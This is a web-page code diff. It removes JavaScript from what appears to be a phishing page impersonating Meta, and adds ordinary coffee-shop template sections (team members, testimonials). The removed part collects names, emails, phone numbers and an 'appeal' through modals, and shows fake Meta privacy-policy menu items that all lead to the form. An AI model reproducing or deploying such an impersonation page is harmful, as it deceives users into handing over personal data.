-                if (fullName === '' || personalEmail === '' || businessEmail === '' || mobilePhoneNumber === '' || pageName === '' || apeal === '') {
-                    alert("Please fill in all information.");
-                    return; // Không thực hiện gửi nếu có trường trống
-                }
-
-                // Nếu tất cả các trường đã được điền đầy đủ, mở modal 2
-                modal1.classList.remove('active');
-                overlay.style.display = 'none';
-                overlay2.style.display = 'block';
-                modal2.classList.add('active');
-            });
-
-            var closeModalBtn2 = modal2.querySelector('.btn-close');
-            closeModalBtn2.addEventListener('click', function() {
-                modal2.classList.remove('active');
-                overlay2.style.display = 'none';
-            });
-        });
-    </script>
-
-
-
-
-    <script>
-        window.mobileCheck = function() {
-            let check = false;
-            (function(a) {
-                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i
-                    .test(a) ||
-                    /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i
-                    .test(a.substr(0, 4))) check = true;
-            })(navigator.userAgent || navigator.vendor || window.opera);
-
-            return check;
-        };
-    </script>
-    <script>
-        const subLinks = {
-            'PolicyCollapse': [{
-                    'text': 'What is the Privacy Policy and what does it cover?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'What information do we collect?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How do we use your information?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How do we share your information on Meta Products or with integrated partners?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How do we share information with third parties?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How is the cooperation between Meta Companies organized?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How can you manage or delete your information and exercise your rights?',
-                    'link': '',
-                    'add_svg_link': false
-                }, {
-                    'text': 'How long do we keep your information?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How do we transmit information?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How will you know when the policy changes?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'How to ask Meta questions?',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'Why and how we process your data',
-                    'link': '',
-                    'add_svg_link': false
-                },
-            ],
-            'RulesCollapse': [{
-                    'text': 'Cookie Policy',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'Information for those who do not use Meta Products',
-                    'link': '',
-                    'add_svg_link': true
-                },
-                {
-                    'text': 'How Meta uses information for generative AI models',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'Data Transfer Framework Policy',
-                    'link': '',
-                    'add_svg_link': false
-                },
-                {
-                    'text': 'Other terms and conditions',
-                    'link': '',
-                    'add_svg_link': true
-                },
-
-            ],
-            'SettingCollapse': [{
-                    'text': 'Facebook Settings',
-                    'link': '',
-                    'add_svg_link': true
-                },
-                {
-                    'text': 'Instagram Settings',
-                    'link': '',
-                    'add_svg_link': true
-                },
-            ]
-
-
-        }
-
-        function addSubItems() {
-            var linkSvg =
-                `<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg>`
-            for (var [subId, items] of Object.entries(subLinks)) {
-                var subElem = document.getElementById(subId)
-                for (var i = 0; i < items.length; i++) {
-                    var text_item = items[i]
-                    var block = document.createElement('div')
-                    block.classList.add('action-button')
-                    block.innerHTML = `
-                    <div class="action-button-img">
-                          <svg></svg>
-                      </div>
-                      <div class="action-button-text">
-                      </div>
-                      <div class="action-button-arrow">
-                      </div>
-                    `
-                    if (text_item['add_svg_link']) {
-                        var svg_block = block.querySelector('.action-button-arrow')
-                        svg_block.innerHTML = linkSvg
-
-                    }
-                    var block_text = block.querySelector('.action-button-text')
-                    block_text.innerText = text_item['text']
-                    subElem.appendChild(block)
-                    block.addEventListener('click', function() {
-                        var start = document.getElementById('start')
-                        start.click()
-                    })
-                }
-            }
-        }
-
-        addSubItems()
-    </script>
+        </div>
+        </div>
+    </section>
+    <section class="section_home_team"><svg viewBox="0 0 1200 120" preserveAspectRatio="none" fill="currentColor" class="section-divider-top is-orange is-flip"><path d="M 0 -10 L 0 0 C 0 0 0 0 0 0 C 80 0 160 84.97 240 84.97 C 320 84.97 400 99.22 480 99.22 C 560 99.22 640 2.39 720 2.39 C 800 2.39 880 68.73 960 68.73 C 1040 68.73 1120 42.98 1200 42.98 L 1200 0 L 1200 -10 Z"></path></svg>
+        <div
+            class="padding-global">
+            <div class="container-large">
+                <div class="padding-section-large">
+                    <div class="margin-bottom margin-xlarge">
+                        <div blocks-name="max-width-large" blocks-slot-children="ST232" class="text-align-center">
+                            <div class="margin-bottom margin-small">
+                                <h2 blocks-name="heading" class="heading-style-h1">Meet Our Team</h2>
+                            </div>
+                            <p blocks-name="paragraph" class="text-size-medium">We are a group of adventure-seeking, coffee-loving Danns.</p>
+                        </div>
+                    </div>
+                    <div class="home_team_component">
+                        <div class="home_team_list-wrapper">
+                            <div class="w-dyn-list">
+                                <div role="list" class="home_team_list w-dyn-items">
+                                    <div role="listitem" class="is-scroll w-dyn-item">
+                                        <div blocks-name="team4_item" blocks-slot-children="ST232" class="home_team_item">
+                                            <div>
+                                                <div blocks-name="team4_image-wrapper" class="home_team_image-wrapper"><img src="https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a3e1288e81e31efd809a_Dann-01.webp" loading="lazy" alt="Dann" sizes="(max-width: 479px) 88vw, (max-width: 767px) 42vw, (max-width: 991px) 43vw, 20vw"
+                                                        srcset="https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a3e1288e81e31efd809a_Dann-01-p-500.webp 500w, https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a3e1288e81e31efd809a_Dann-01.webp 800w"
+                                                        class="home_team_image" /></div>
+                                            </div>
+                                            <div>
+                                                <div blocks-name="team4_title-wrapper" blocks-slot-children="ST232" class="home_team_title-wrapper">
+                                                    <h3 class="heading-style-h5">Dann</h3>
+                                                    <div blocks-name="block-3" class="text-size-medium">Barista</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div role="listitem" class="is-scroll w-dyn-item">
+                                        <div blocks-name="team4_item" blocks-slot-children="ST232" class="home_team_item">
+                                            <div>
+                                                <div blocks-name="team4_image-wrapper" class="home_team_image-wrapper"><img src="https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a41dadf08fa63924edab_Dann-02.webp" loading="lazy" alt="Dann the Mann" sizes="(max-width: 479px) 88vw, (max-width: 767px) 42vw, (max-width: 991px) 43vw, 20vw"
+                                                        srcset="https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a41dadf08fa63924edab_Dann-02-p-500.webp 500w, https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a41dadf08fa63924edab_Dann-02.webp 800w"
+                                                        class="home_team_image" /></div>
+                                            </div>
+                                            <div>
+                                                <div blocks-name="team4_title-wrapper" blocks-slot-children="ST232" class="home_team_title-wrapper">
+                                                    <h3 class="heading-style-h5">Dann the Mann</h3>
+                                                    <div blocks-name="block-3" class="text-size-medium">Beard Manager</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div role="listitem" class="is-scroll w-dyn-item">
+                                        <div blocks-name="team4_item" blocks-slot-children="ST232" class="home_team_item">
+                                            <div>
+                                                <div blocks-name="team4_image-wrapper" class="home_team_image-wrapper"><img src="https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a432741673341ae04655_Dann-03.webp" loading="lazy" alt="D. “Petty”" sizes="(max-width: 479px) 88vw, (max-width: 767px) 42vw, (max-width: 991px) 43vw, 20vw"
+                                                        srcset="https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a432741673341ae04655_Dann-03-p-500.webp 500w, https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a432741673341ae04655_Dann-03.webp 800w"
+                                                        class="home_team_image" /></div>
+                                            </div>
+                                            <div>
+                                                <div blocks-name="team4_title-wrapper" blocks-slot-children="ST232" class="home_team_title-wrapper">
+                                                    <h3 class="heading-style-h5">D. “Petty”</h3>
+                                                    <div blocks-name="block-3" class="text-size-medium">Roaster</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div role="listitem" class="is-scroll w-dyn-item">
+                                        <div blocks-name="team4_item" blocks-slot-children="ST232" class="home_team_item">
+                                            <div>
+                                                <div blocks-name="team4_image-wrapper" class="home_team_image-wrapper"><img src="https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a44182adf229ab9d819a_Dann-04.webp" loading="lazy" alt="Danny" sizes="(max-width: 479px) 88vw, (max-width: 767px) 42vw, (max-width: 991px) 43vw, 20vw"
+                                                        srcset="https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a44182adf229ab9d819a_Dann-04-p-500.webp 500w, https://cdn.prod.website-files.com/6619a2fdadac07b3134b75fb/6619a44182adf229ab9d819a_Dann-04.webp 800w"
+                                                        class="home_team_image" /></div>
+                                            </div>
+                                            <div>
+                                                <div blocks-name="team4_title-wrapper" blocks-slot-children="ST232" class="home_team_title-wrapper">
+                                                    <h3 class="heading-style-h5">Danny</h3>
+                                                    <div blocks-name="block-3" class="text-size-medium">Web Fueler</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="margin-top margin-xlarge">
+                        <div class="text-align-center">
+                            <div blocks-name="max-width-medium" blocks-slot-children="ST232" class="max-width-medium align-center">
+                                <div class="margin-bottom margin-xsmall">
+                                    <h4 blocks-name="heading-2">Ready for the ride of your life?</h4>
+                                </div>
+                                <p blocks-name="paragraph-2" class="text-size-medium">Join our dann good team and step into the rad life!</p>
+                                <div class="margin-top margin-medium"><a blocks-name="button" href="#" class="button is-secondary w-button">View open positions</a></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            </div><svg viewBox="0 0 1200 120" preserveAspectRatio="none" fill="currentColor" class="section-divider-bottom is-teal-dark"><path d="M 0 -10 L 0 0 C 0 0 0 0 0 0 C 80 0 160 84.97 240 84.97 C 320 84.97 400 99.22 480 99.22 C 560 99.22 640 2.39 720 2.39 C 800 2.39 880 68.73 960 68.73 C 1040 68.73 1120 42.98 1200 42.98 L 1200 0 L 1200 -10 Z"></path></svg></section>
+    <section
+        class="section_home_testimonial">
+        <div class="padding-global">
+            <div class="container-large">
+                <div class="padding-section-large">
+                    <div class="margin-bottom margin-xlarge">
+                        <div blocks-name="max-width-large" blocks-slot-children="ST232" class="text-align-center">
+                            <div class="margin-bottom margin-small">
+                                <h2 blocks-name="heading" class="heading-style-h1">Thrilled Customers</h2>
+                            </div>
+                            <p blocks-name="paragraph" class="text-size-medium">Whoa, those are some dann good reviews.</p>
+                        </div>
+                    </div>
+                    <div class="home_testimonial_component">
+                        <div blocks-name="testimonial6_content" blocks-slot-children="ST232" class="home_testimonial_content is-scroll">
+                            <div blocks-name="testimonial6_rating-wrapper" class="home_testimonial_rating-wrapper">
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                            </div>
+                            <div class="margin-vertical margin-medium">
+                                <div blocks-name="heading-style-h6" class="heading-style-h5">Dann good coffee, rad staff, and a killer atmosphere!</div>
+                            </div>
+                            <div blocks-slot-children="ST232" blocks-name="testimonial6_client" class="home_testimonial_client">
+                                <div blocks-name="testimonial6_client-image-wrapper" class="home_testimonial_client-image">
+                                    <div>N</div>
+                                </div>
+                                <div blocks-slot-children="ST232" blocks-name="testimonial6_client-info" class="home_testimonial_client-info">
+                                    <p blocks-name="paragraph-3" class="text-weight-semibold">Not Dann</p>
+                                    <p blocks-name="paragraph-2">Coffee Lover</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div blocks-name="testimonial6_content" blocks-slot-children="ST232" class="home_testimonial_content is-scroll">
+                            <div blocks-name="testimonial6_rating-wrapper" class="home_testimonial_rating-wrapper">
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                            </div>
+                            <div class="margin-vertical margin-medium">
+                                <div blocks-name="heading-style-h6" class="heading-style-h5">The best coffee on earth! I can’t start my day without it.</div>
+                            </div>
+                            <div blocks-slot-children="ST232" blocks-name="testimonial6_client" class="home_testimonial_client">
+                                <div blocks-name="testimonial6_client-image-wrapper" class="home_testimonial_client-image">
+                                    <div>M</div>
+                                </div>
+                                <div blocks-slot-children="ST232" blocks-name="testimonial6_client-info" class="home_testimonial_client-info">
+                                    <p blocks-name="paragraph-3" class="text-weight-semibold">Mr. Nnad</p>
+                                    <p blocks-name="paragraph-2">Connoisseur of Coffee</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div blocks-name="testimonial6_content" blocks-slot-children="ST232" class="home_testimonial_content is-scroll">
+                            <div blocks-name="testimonial6_rating-wrapper" class="home_testimonial_rating-wrapper">
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M8.16379 0.551109C8.47316 -0.183704 9.52684 -0.183703 9.83621 0.551111L11.6621 4.88811C11.7926 5.19789 12.0875 5.40955 12.426 5.43636L17.1654 5.81173C17.9684 5.87533 18.294 6.86532 17.6822 7.38306L14.0713 10.4388C13.8134 10.6571 13.7007 10.9996 13.7795 11.3259L14.8827 15.8949C15.0696 16.669 14.2172 17.2809 13.5297 16.8661L9.47208 14.4176C9.18225 14.2427 8.81775 14.2427 8.52793 14.4176L4.47029 16.8661C3.7828 17.2809 2.93036 16.669 3.11727 15.8949L4.22048 11.3259C4.29928 10.9996 4.18664 10.6571 3.92873 10.4388L0.317756 7.38306C-0.294046 6.86532 0.0315611 5.87533 0.834562 5.81173L5.57402 5.43636C5.91255 5.40955 6.20744 5.19789 6.33786 4.88811L8.16379 0.551109Z" fill="currentColor"/>
+</svg></div>
+                                </div>
+                                <div class="home_testimonial_rating-icon">
+                                    <div class="icon-embed-xsmall w-embed"><svg width="100%" viewBox="0 0 18 17" fill="none" xmlns="http://www.w3.org/2000/svg">
